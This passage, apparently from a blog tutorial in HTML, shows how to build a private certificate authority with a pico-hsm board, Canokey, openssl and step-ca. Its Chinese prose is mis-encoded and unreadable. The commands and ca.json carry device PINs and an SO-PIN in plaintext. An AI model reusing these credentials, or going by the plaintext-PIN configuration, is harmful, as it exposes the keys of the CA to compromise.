Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub</span><br><span class="line">Bus 003 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ– pico-hsm  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 pico-hsm-tool.py --pin 648219 initialize --so-pin 57621880</span><br></pre></td></tr></table></figure>      </div><div id="init-pico-hsm-commissioner" class="tab-content">          <p><a href="https://www.picokeys.com/pico-commissioner/">https://www.picokeys.com/pico-commissioner/</a><br><img src="/pictures/pico-hsm/pico-commissioner.png" alt="pico-commissioner">  </p>      </div><h3 id="åˆ›å»ºRootCAå’Œä¸­é—´CA"><a href="#åˆ›å»ºRootCAå’Œä¸­é—´CA" class="headerlink" title="åˆ›å»ºRootCAå’Œä¸­é—´CA"></a>åˆ›å»ºRootCAå’Œä¸­é—´CA</h3><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯åˆ›å»ºåå¯¼å…¥çš„æ–¹å¼ï¼Œè™½ç„¶åœ¨ä½¿ç”¨æ­£è§„HSMäº§å“çš„æ—¶å€™éƒ½æ˜¯å»ºè®®ä»…åœ¨è®¾å¤‡ä¸Šç”Ÿæˆå¯†é’¥ä¸”ä¸è¦å¯¼å…¥å¯¼å‡ºï¼Œä½†æ˜¯æˆ‘ä»¬è¿™ä¸ª10å—é’±çš„å¼€å‘æ¿æŒ‡ä¸å®šä»€ä¹ˆæ—¶å€™å°±ä¼šåï¼Œæ‰€ä»¥å¤šä¸€ä»½å¤‡ä»½æ˜¯å¿…é¡»çš„ã€‚  </p><p>ç”ŸæˆRootCAç§é’¥  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> -p certificate-authority/newcerts</span><br><span class="line">$ <span class="built_in">touch</span> certificate-authority/index.txt</span><br><span class="line">$ openssl ecparam -genkey -name secp384r1 -noout -out root-ca-key.pem</span><br></pre></td></tr></table></figure><figure class="highlight ini"><figcaption><span>create_root_cert.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[ ca ]</span></span><br><span class="line"><span class="comment"># `man ca`</span></span><br><span class="line"><span class="attr">default_ca</span> = CA_default</span><br><span class="line"></span><br><span class="line"><span class="section">[ CA_default ]</span></span><br><span class="line"><span class="comment"># Directory and file locations.</span></span><br><span class="line"><span class="attr">dir</span>               = certificate-authority</span><br><span class="line"><span class="attr">certs</span>             = <span class="variable">$dir</span>/certs</span><br><span class="line"><span class="attr">crl_dir</span>           = <span class="variable">$dir</span>/crl</span><br><span class="line"><span class="attr">new_certs_dir</span>     = <span class="variable">$dir</span>/newcerts</span><br><span class="line"><span class="attr">database</span>          = <span class="variable">$dir</span>/index.txt</span><br><span class="line"><span class="attr">serial</span>            = <span class="variable">$dir</span>/serial</span><br><span class="line"></span><br><span class="line"><span class="comment"># SHA-1 is deprecated, so use SHA-2 instead.</span></span><br><span class="line"><span class="attr">default_md</span>        = sha512</span><br><span class="line"></span><br><span class="line"><span class="attr">name_opt</span>          = ca_default</span><br><span class="line"><span class="attr">cert_opt</span>          = ca_default</span><br><span class="line"><span class="attr">default_days</span>      = <span class="number">375</span></span><br><span class="line"><span class="attr">preserve</span>          = <span class="literal">no</span></span><br><span class="line"><span class="attr">policy</span>            = policy_strict</span><br><span class="line"></span><br><span class="line"><span class="section">[ policy_strict ]</span></span><br><span class="line"><span class="comment"># The root CA should only sign intermediate certificates that match.</span></span><br><span class="line"><span class="comment"># See the POLICY FORMAT section of `man ca`.</span></span><br><span class="line"><span class="attr">countryName</span>             = match</span><br><span class="line"><span class="attr">stateOrProvinceName</span>     = match</span><br><span class="line"><span class="attr">organizationName</span>        = match</span><br><span class="line"><span class="attr">organizationalUnitName</span>  = optional</span><br><span class="line"><span class="attr">commonName</span>              = supplied</span><br><span class="line"><span class="attr">emailAddress</span>            = optional</span><br><span class="line"></span><br><span class="line"><span class="section">[ req ]</span></span><br><span class="line"><span class="comment"># Options for the `req` tool (`man req`).</span></span><br><span class="line"><span class="attr">default_bits</span>        = <span class="number">4096</span></span><br><span class="line"><span class="attr">distinguished_name</span>  = req_distinguished_name</span><br><span class="line"><span class="attr">string_mask</span>         = utf8only</span><br><span class="line"><span class="attr">prompt</span>              = <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SHA-1 is deprecated, so use SHA-2 instead.</span></span><br><span class="line"><span class="attr">default_md</span>          = sha512</span><br><span class="line"></span><br><span class="line"><span class="section">[ req_distinguished_name ]</span></span><br><span class="line"><span class="attr">C</span>                   = CN</span><br><span class="line"><span class="attr">O</span>                   = D9Lab</span><br><span class="line"><span class="attr">OU</span>                  = D9Lab Zero Certificate Authority</span><br><span class="line"><span class="attr">CN</span>                  = D9Lab Zero Root CA</span><br><span class="line"></span><br><span class="line"><span class="section">[ v3_ca ]</span></span><br><span class="line"><span class="comment"># Extensions for a typical CA (`man x509v3_config`).</span></span><br><span class="line"><span class="attr">subjectKeyIdentifier</span> = hash</span><br><span class="line"><span class="attr">authorityKeyIdentifier</span> = keyid:always,issuer</span><br><span class="line"><span class="attr">basicConstraints</span> = critical, CA:<span class="literal">true</span></span><br><span class="line"><span class="attr">keyUsage</span> = critical, digitalSignature, cRLSign, keyCertSign</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”ŸæˆRootCAè¯ä¹¦  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -config create_root_cert.ini -new -key root-ca-key.pem -x509 -days 3650 -sha512 -extensions v3_ca -out root-ca.crt</span><br></pre></td></tr></table></figure><p>RootCAçš„å¯†é’¥å’Œè¯ä¹¦å¦‚æœæœ‰æ¡ä»¶çš„è¯å»ºè®®å¯¼å…¥åˆ°ä¸é‚£ä¹ˆçµè½¦çš„è®¾å¤‡é‡Œï¼Œ<a href="https://thinkalone.win/canokey-canary.html#PIV">å¦‚Canokeyä¸­ã€‚</a>  </p><p>ç”Ÿæˆä¸­é—´CAç§é’¥  </p><div class="tabs my-3 is-fullwidth">        <ul class="mx-0 my-0">            <li class="is-active">          <a href="#intermediate-ca-hsm">              <p>ä½¿ç”¨HSMè®¾å¤‡</p>          </a>      </li><li>          <a href="#intermediate-ca-file">              <p>ä¸ä½¿ç”¨HSMè®¾å¤‡</p>          </a>      </li>        </ul>    </div>    <div id="intermediate-ca-hsm" class="tab-content">          <p>é¦–å…ˆæš‚æ—¶æ‹”æ‰Pico HSMï¼Œæ’ä¸ŠCanokey&#x2F;YubiKeyä¹‹ç±»çš„è®¾å¤‡<br>å°†è¯ä¹¦å’Œç§é’¥æ‰“åŒ…æˆ<code>p12</code>æ ¼å¼  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ³¨æ„å¿…é¡»è¦è®¾å®šå¯†ç ï¼Œä¸ç„¶å¯¼å…¥çš„æ—¶å€™ä¼šæŠ¥é”™ï¼  </span></span><br><span class="line">$ openssl pkcs12 -<span class="built_in">export</span> -out root-ca.p12 -inkey root-ca-key.pem -<span class="keyword">in</span> root-ca.crt</span><br></pre></td></tr></table></figure><p>å°†<code>p12</code>æ ¼å¼çš„RootCAè¯ä¹¦å¯¼å…¥åˆ°HSMè®¾å¤‡ä¸­ ä»¥Canokeyä¸ºä¾‹  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yubico-piv-tool -r canokeys -s 9a -i root-ca.p12 -KPKCS12 -a import-key -a import-cert</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°å¯¼å…¥è¿›Canokeyçš„è¯ä¹¦id  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pkcs11-tool --module /usr/lib/opensc-pkcs11.so -O</span><br></pre></td></tr></table></figure><p>æ­£å¸¸çš„è¯åº”è¯¥ä¼šæœ‰ç±»ä¼¼è¿™æ ·çš„è¾“å‡ºï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Certificate Object; type = X.509 cert</span><br><span class="line">  label:      Certificate for Key Management</span><br><span class="line">  subject:    DN: C=CN, O=D9Lab, OU=D9Lab Zero Certificate Authority, CN=D9Lab Zero Root CA</span><br><span class="line">  serial:     ************</span><br><span class="line">  ID:         03</span><br><span class="line">  uri:        pkcs11:model=PKCS%2315%20emulated;manufacturer=piv_II;serial=************;token=Disappear9%20%27s%20CanoKey;id=%03;object=Certificate%20for%20Key%20Management;type=cert</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è®°ä¸‹è¿™ä¸ª<code>ID 03</code>ï¼Œæ¥ä¸‹æ¥ä¼šç”¨åˆ°  </p><p>åˆ›å»ºä¸­é—´CAæ¨¡æ¿  </p><figure class="highlight json"><figcaption><span>intermediate.tpl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;subject&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="punctuation">&#123;</span> toJson .Subject <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keyUsage&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;certSign&quot;</span><span class="punctuation">,</span> <span class="string">&quot;crlSign&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;basicConstraints&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;isCA&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;maxPathLen&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;crlDistributionPoints&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;http://ca.lab.d9lab.eu.org/1.0/crl&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆä¸­é—´CAç§é’¥  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ step certificate create \</span><br><span class="line">  <span class="string">&quot;D9Lab Zero Intermediate CA&quot;</span> \</span><br><span class="line">  intermediate-ca.crt \</span><br><span class="line">  intermediate_ca_key_enc \</span><br><span class="line">  --template intermediate.tpl \</span><br><span class="line">  --ca root-ca.crt \</span><br><span class="line">  --ca-kms <span class="string">&#x27;pkcs11:module-path=/usr/lib/opensc-pkcs11.so;serial=************?pin-value=648219&#x27;</span> \</span><br><span class="line">  --ca-key <span class="string">&#x27;pkcs11:id=03&#x27;</span> \</span><br><span class="line">  --not-before <span class="string">&#x27;2025-01-10T00:00:00+08:00&#x27;</span> \</span><br><span class="line">  --not-after <span class="string">&#x27;2030-01-10T00:00:00+08:00&#x27;</span> \</span><br><span class="line">  --kty=EC --curve=P-384</span><br></pre></td></tr></table></figure><p>æ‹”ä¸‹Canokey&#x2F;YubiKeyï¼Œæ¢å›Pico HSM  </p>      </div><div id="intermediate-ca-file" class="tab-content is-hidden">          <p>åˆ›å»ºä¸­é—´CAæ¨¡æ¿  </p><figure class="highlight json"><figcaption><span>intermediate.tpl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;subject&quot;</span><span class="punctuation">:</span> <span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keyUsage&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;certSign&quot;</span><span class="punctuation">,</span> <span class="string">&quot;crlSign&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;basicConstraints&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;isCA&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;maxPathLen&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;crlDistributionPoints&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;http://ca.lab.d9lab.eu.org/1.0/crl&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆä¸­é—´CAç§é’¥  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ step certificate create \</span><br><span class="line">  <span class="string">&quot;D9Lab Zero Intermediate CA&quot;</span> \</span><br><span class="line">  intermediate-ca.crt \</span><br><span class="line">  intermediate_ca_key_enc \</span><br><span class="line">  --template intermediate.tpl \</span><br><span class="line">  --ca root-ca.crt \</span><br><span class="line">  --ca-key root-ca-key.pem \</span><br><span class="line">  --not-before <span class="string">&#x27;2025-01-10T00:00:00+08:00&#x27;</span> \</span><br><span class="line">  --not-after <span class="string">&#x27;2030-01-10T00:00:00+08:00&#x27;</span> \</span><br><span class="line">  --kty=EC --curve=P-384</span><br></pre></td></tr></table></figure>      </div><p>å°†è¯ä¹¦å’Œç§é’¥æ‰“åŒ…æˆ<code>p12</code>æ ¼å¼  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ openssl ec -<span class="keyword">in</span> intermediate_ca_key_enc -out intermediate-ca-key.pem</span><br><span class="line"><span class="comment"># æ³¨æ„å¿…é¡»è¦è®¾å®šå¯†ç ï¼Œä¸ç„¶å¯¼å…¥çš„æ—¶å€™ä¼šæŠ¥é”™ï¼  </span></span><br><span class="line">$ openssl pkcs12 -<span class="built_in">export</span> -out intermediate-ca.p12 -inkey intermediate-ca-key.pem -<span class="keyword">in</span> intermediate-ca.crt -certfile root-ca.crt</span><br></pre></td></tr></table></figure><h3 id="å°†ä¸­é—´CAè¯ä¹¦å’Œå¯†é’¥å¯¼å…¥-pico-hsm"><a href="#å°†ä¸­é—´CAè¯ä¹¦å’Œå¯†é’¥å¯¼å…¥-pico-hsm" class="headerlink" title="å°†ä¸­é—´CAè¯ä¹¦å’Œå¯†é’¥å¯¼å…¥ pico-hsm"></a>å°†ä¸­é—´CAè¯ä¹¦å’Œå¯†é’¥å¯¼å…¥ pico-hsm</h3><p>é¦–å…ˆå‚è€ƒ pico-hsm ä½œè€…çš„è¯´æ˜ï¼Œä¸‹è½½å¹¶ä¿®æ”¹SCS3 toolï¼š<br><a href="https://github.com/polhenarejos/pico-hsm/blob/master/doc/scs3.md">https://github.com/polhenarejos/pico-hsm/blob/master/doc/scs3.md</a>  </p><p>ç„¶åå‚è€ƒ <a href="https://docs.nitrokey.com/nitrokeys/features/hsm/import-keys-certs#importing-via-the-scsh3-gui">docs.nitrokey.com</a> å¯¼å…¥<code>intermediate-ca.p12</code>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Inside the unpacked directory you will find scsh3gui, which can be started using bash scsh3gui (for windows double-click on: scsh3gui.cmd).</span><br><span class="line"></span><br><span class="line">Start key-manager (File -&gt; Keymanager)</span><br><span class="line">Right-click â€œSmartcard-HSMâ€ -&gt; create DKEK share</span><br><span class="line">Choose file location</span><br><span class="line">Choose DKEK share password</span><br><span class="line">Right-click â€œSmartcard-HSMâ€ -&gt; Initialize device</span><br><span class="line">Enter SO-PIN</span><br><span class="line">(optional) Enter label and enter URL/Host</span><br><span class="line">Select authentication method: â€œUser PINâ€</span><br><span class="line">Allow RESET RETRY COUNTER: â€œResetting and unblocking PIN with SO-PIN not allowedâ€</span><br><span class="line">Enter and confirm User PIN</span><br><span class="line">â€œSelect Device Key Encryption schemeâ€ -&gt; â€œDKEK sharesâ€</span><br><span class="line">Enter number of DKEK shares: 1</span><br><span class="line">Right-click DKEK set-up in progress -&gt; â€œImport DKEK shareâ€</span><br><span class="line">Choose DKEK share file location</span><br><span class="line">Password for DKEK share</span><br><span class="line">Right-click â€œSmartCard-HSMâ€ -&gt; â€œImport from PKCS#12(Old)â€</span><br><span class="line">Enter number of shares -&gt; 1</span><br><span class="line">Enter file location of DKEK share</span><br><span class="line">Enter Password for DKEK share</span><br><span class="line">Select PKCS#12 container for import (Enter password)</span><br><span class="line">Select Key</span><br><span class="line">Select Name to be used (intermediate-ca)</span><br><span class="line">Import more keys, if needed</span><br></pre></td></tr></table></figure><p>å¯¼å…¥å®Œæˆåè¿è¡Œ<code>pkcs11-tool -O</code>åº”è¯¥å°±å¯ä»¥çœ‹åˆ°å¯¼å…¥çš„è¯ä¹¦äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pkcs11-tool -O</span><br><span class="line">  Using slot 0 with a present token (0x0)</span><br><span class="line">  Certificate Object; <span class="built_in">type</span> = X.509 cert</span><br><span class="line">    label:      intermediate-ca</span><br><span class="line">    subject:    DN: C=CN, O=D9Lab, OU=D9Lab Zero Certificate Authority, CN=D9Lab Zero Intermediate CA</span><br><span class="line">    ID:         01</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è®°ä¸‹<code>ID</code>å’Œ<code>label</code>ï¼Œåé¢è¦ç”¨åˆ°ã€‚  </p><p>æŠŠè¿™äº›æ–‡ä»¶æ‹¿7zæ‰“ä¸ªåŠ å¯†å‹ç¼©åŒ…ï¼Œå¯†ç ç”¨KeePassç”Ÿæˆä¸€ä¸ªå¤Ÿé•¿çš„ä¿å­˜ï¼Œç„¶åæ‰¾ä¸ªä½ å–œæ¬¢çš„ç½‘ç›˜å­˜å¥½æˆ–è€…åˆ»å¼ å…‰ç›˜æ”¾è¡£æŸœé‡Œã€‚  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">intermediate-ca-key.pem</span><br><span class="line">intermediate-ca.crt</span><br><span class="line">intermediate-ca.p12</span><br><span class="line">pdeæ–‡ä»¶ï¼ˆDKEKï¼‰</span><br><span class="line">root-ca-key.pem</span><br><span class="line">root-ca.crt</span><br><span class="line">root-ca.p12</span><br></pre></td></tr></table></figure><p>ä¹‹ååªä¿ç•™<code>intermediate-ca.crt</code>å’Œ<code>root-ca.crt</code>ï¼Œå…¶ä½™æ–‡ä»¶å…¨éƒ¨åˆ é™¤  </p><h3 id="é…ç½®step-ca"><a href="#é…ç½®step-ca" class="headerlink" title="é…ç½®step-ca"></a>é…ç½®step-ca</h3><p><a href="https://smallstep.com/docs/step-ca/cryptographic-protection/#pkcs-11">https://smallstep.com/docs/step-ca/cryptographic-protection/#pkcs-11</a>  </p><p>åˆå§‹åŒ–  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> pcscd</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl start pcscd</span><br><span class="line">$ <span class="built_in">sudo</span> useradd step</span><br><span class="line">$ <span class="built_in">sudo</span> passwd -l step</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">mkdir</span> /etc/step-ca</span><br><span class="line">$ <span class="built_in">export</span> STEPPATH=/etc/step-ca</span><br><span class="line">$ <span class="built_in">sudo</span> --preserve-env step ca init --name=<span class="string">&quot;D9Lab Zero CA&quot;</span> \</span><br><span class="line">    --dns=<span class="string">&quot;ca.lab.d9lab.eu.org&quot;</span> --address=<span class="string">&quot;:4443&quot;</span> \</span><br><span class="line">    --provisioner=<span class="string">&quot;disappear9@outlook.com&quot;</span> \</span><br><span class="line">    --deployment-type standalone \</span><br><span class="line">    --remote-management</span><br><span class="line"><span class="comment"># è®°å¥½è‡ªå·±è®¾ç½®çš„ provisioner key</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">rm</span> /etc/step-ca/certs/*</span><br><span class="line"><span class="comment"># å°†ä¿å­˜çš„ intermediate-ca.crt å’Œ root-ca.crt å¤åˆ¶åˆ°/etc/step-ca/certs/</span></span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">rm</span> -rf /etc/step-ca/secrets</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">chown</span> -R step:step /etc/step-ca</span><br><span class="line">$ step kms create --json --kms <span class="string">&quot;pkcs11:module-path=/usr/lib/opensc-pkcs11.so;serial=ESPICOHSMTR?pin-value=648219&quot;</span> <span class="string">&quot;pkcs11:id=2000;object=ssh-host-ca&quot;</span></span><br><span class="line">$ step kms create --json --kms <span class="string">&quot;pkcs11:module-path=/usr/lib/opensc-pkcs11.so;serial=ESPICOHSMTR?pin-value=648219&quot;</span> <span class="string">&quot;pkcs11:id=2001;object=ssh-user-ca&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–è¾‘<code>/etc/step-ca/config/ca.json</code>  </p><figure class="highlight json"><figcaption><span>ca.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;root&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/etc/step-ca/certs/root-ca.crt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;crt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/etc/step-ca/certs/intermediate-ca.crt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pkcs11:id=01;object=intermediate-ca&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pkcs11&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pkcs11:module-path=/usr/lib/opensc-pkcs11.so;serial=ESPICOHSMTR?pin-value=648219&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;ssh&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;hostKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pkcs11:id=2000;object=ssh-host-ca&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;userKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pkcs11:id=2001;object=ssh-user-ca&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°è¯•è¿è¡Œ  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ–°å¼€ä¸€ä¸ªçª—å£</span></span><br><span class="line">$ screen</span><br><span class="line">$ <span class="built_in">sudo</span> -u step step-ca /etc/step-ca/config/ca.json</span><br><span class="line"><span class="comment"># è®°ä¸‹fingerprintå€¼ï¼Œä¸‹é¢ä¼šç”¨åˆ°</span></span><br></pre></td></tr></table></figure><p>æ–°å¼€ä¸€ä¸ªçª—å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">unset</span> STEPPATH</span><br><span class="line">$ step ca bootstrap --ca-url <span class="string">&quot;https://ca.lab.d9lab.eu.org:4443&quot;</span> --fingerprint d6b3b9ef79a42aeeabcd5580b2b516458ddb25d1af4ea7ff0845e624ec1bb609</span><br><span class="line">The root certificate has been saved <span class="keyword">in</span> /home/disappear9/.step/certs/root_ca.crt.</span><br><span class="line">The authority configuration has been saved <span class="keyword">in</span> /home/disappear9/.step/config/defaults.json.</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¥æµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½æ­£å¸¸ç­¾å‡ºè¯ä¹¦</span></span><br><span class="line">$ step ca certificate <span class="string">&quot;localhost&quot;</span> localhost.crt localhost.key</span><br><span class="line">$ step ca provisioner add acme --<span class="built_in">type</span> acme --admin-name step</span><br></pre></td></tr></table></figure><h3 id="é…ç½®æœåŠ¡"><a href="#é…ç½®æœåŠ¡" class="headerlink" title="é…ç½®æœåŠ¡"></a>é…ç½®æœåŠ¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 